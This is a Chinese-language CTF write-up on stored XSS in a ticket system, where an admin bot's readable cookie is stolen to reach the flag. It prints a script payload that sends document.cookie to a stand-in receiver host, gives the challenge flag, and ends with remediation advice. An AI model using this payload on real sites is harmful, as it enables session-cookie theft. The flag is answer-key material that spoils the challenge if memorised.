# A Cookie for Baby Bot

## 题目简述

用户可以创建工单并请求管理员机器人访问。工单消息在详情页中未经 HTML 转义直接输出；机器人访问时携带保存管理员口令的可读 Cookie。目标是利用存储型 XSS 取得该 Cookie，再以管理员身份查看 flag。

## 解题过程

先在可公网接收请求的地址准备记录服务，然后创建工单，把消息设置为能在页面加载时发起外部请求的脚本。例如：

    <script>location='https://receiver.example/?c='+encodeURIComponent(document.cookie)</script>

提交工单给管理员机器人。机器人打开详情页后，浏览器把消息解析成脚本，`document.cookie` 中可读的 `admin_pass` 随请求到达接收端。拿到其值后，在自己的请求中设置同名 Cookie，再访问管理员工单接口，即可取得：

    byuctf{s33_1t5_3asy!}

利用成立的两个必要条件分别是：消息输出没有上下文转义，以及敏感 Cookie 没有设置 `HttpOnly`。只有其中一个问题时，当前窃取链都不会完整成立。

## 方法总结

管理员机器人题应逐项确认注入点、机器人访问路径、Cookie 属性和 flag 所在接口。修复需要对用户内容按 HTML 上下文编码，并给会话 Cookie 设置 `HttpOnly`、`Secure` 和合适的 `SameSite`；内容安全策略可以降低影响，但不能代替输出转义。
